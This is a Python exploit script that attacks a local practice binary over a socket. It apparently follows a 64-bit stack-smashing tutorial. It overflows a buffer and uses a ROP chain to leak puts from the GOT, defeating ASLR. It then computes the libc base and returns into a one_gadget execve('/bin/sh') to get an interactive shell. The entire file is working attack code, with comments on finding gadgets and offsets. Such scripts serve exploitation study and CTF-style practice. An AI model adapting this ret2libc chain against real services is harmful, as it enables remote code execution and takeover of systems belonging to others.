#!/usr/bin/python3
# aslr bypass
# binary info:
# checksec local-stack-nx
# [*] 'local-stack-nx'
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)
#
# ubuntu 18.04, cat /proc/sys/kernel/randomize_va_space = 2
# ldd local-stack-nx; find local libc 
# ref: https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
# socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./local-stack-nx

from socket import *
from struct import *
import telnetlib

#pad will null bytes in order to unpack
def pad_null_bytes(value):
	return value + b'\x00' * (8-len(value))

poprdi = 0x4006f3 # ROPgadget.py --binary local-stack-nx | grep "pop rdi"; gadget to pop value into rdi so we may print it 
putsgot = 0x601018 # objdump -R local-stack-nx | grep puts OR with radare2, r2 -AAA local-stack-nx, then ir
putsplt = 0x4004e0 # used radare2; r2 -AAA local-stack-nx, then afl to find puts@plt
ret = 0x4004c9 #0x00000000004004c9 : ret ; ret gadget will pop off the 8 bytes on top of stack and return to that so it will realign the stack to 16 bytes to fix getting segmentation fault in "movaps XMMWORD PTR [rsp+0x40],xmm0" while calling system
main = 0x400655 # readelf -s local-stack-nx | grep main
one_gadget = 0x4f3c2 #0x4f3c2 execve("/bin/sh", rsp+0x40, environ)  constraints:[rsp+0x40] == NULL
putslibc =0x80a30 # puts offset in libc; readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts

buf1 = b"".join([b"A"*72,
	pack("<Q", poprdi),
	pack("<Q", putsgot), # leak puts addr in got
	pack("<Q", putsplt), #call puts@plt to leak puts got address
	pack("<Q", main) # redirect program execution flow back to main
	])

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2323))

print (s.recv(1024)) #An easy one to get you started...\n\n
s.send(buf1 + b"\n")
#print (s.recv(1024).split(b'\n'))  
d = s.recv(1024).split(b'\n') # split on \n; receive whole response, including the 2nd An easy one to get you started...\n\n from main     
#d = s.recv(1024)[-8:] 

puts_leak = unpack("<Q", pad_null_bytes(d[1].strip())) # puts leaked bytes in d[1]; 
puts_leak_val=puts_leak[0] # leaked put's got value
#plv = str(puts_leak_val)
print ("puts is at ",  hex(puts_leak_val))

#print ("plv is at", hex(int(plv)))
#print ("plv is at", hex(int(plv)))
#print ("fixed puts() is at", hex(puts_leak_val)[0:14])
#print ("fixed1 puts() is at", hex(puts_leak_val)[2:14])
#print ("puts_leak_val hex length is ",  len(hex(puts_leak_val)))
#print ("puts plt is at ", hex(putsplt))

libc_base = puts_leak_val - putslibc
execve = libc_base + one_gadget
print ("libc base is at", hex(libc_base))
print ("execve is at", hex(execve))

#overflow again and redirect to execve
buf2 = b"".join([b"B"*72,
	pack("<Q", execve),
	b"\x00"*40
	])

s.send(buf2 + b"\n") 
print (s.recv(1024))

print ("dropping into a shell...")  
# get a shell
t = telnetlib.Telnet()
t.sock = s
t.interact()